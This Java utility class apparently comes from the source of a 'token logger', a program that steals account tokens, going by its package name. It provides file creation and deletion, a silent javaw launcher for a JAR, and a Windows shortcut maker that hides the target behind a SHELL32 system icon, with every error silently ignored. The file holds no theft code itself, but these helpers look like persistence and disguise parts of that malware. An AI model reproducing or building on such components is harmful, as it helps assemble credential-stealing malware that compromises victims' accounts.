package tokenlogger.utils;

import java.io.File;
import java.io.IOException;
import java.nio.file.Paths;

import mslinks.ShellLink;

public class FileHelper {
    public static boolean createFile(String filePath) throws IOException {
        File file = Paths.get(filePath).toFile();
        if (!file.exists()) return file.createNewFile();
        return true;
    }
    public static void delete(String filePath) {
        File file = new File(filePath);
        if (file.exists()) file.delete();
    }

    public static void launch(String appPath) {
        try {
            ProcessBuilder processBuilder = new ProcessBuilder("javaw", "-jar", appPath);
            processBuilder.start();
        } catch (Exception ignored) {}
    }

    public static void createShortcut(String targetPath, String savePath, String... args) {
        try {
            ShellLink sl = new ShellLink();
            sl.setTarget(targetPath);
            sl.setIconLocation("%SystemRoot%\\system32\\SHELL32.dll");
            sl.getHeader().setIconIndex(46);
            StringBuilder argsList = new StringBuilder();
            for (String arg : args) {
                argsList.append(arg).append(" ");
            }
            sl.setCMDArgs(argsList.toString());
            sl.saveTo(savePath);
        } catch (Exception ignored) {}
    }
}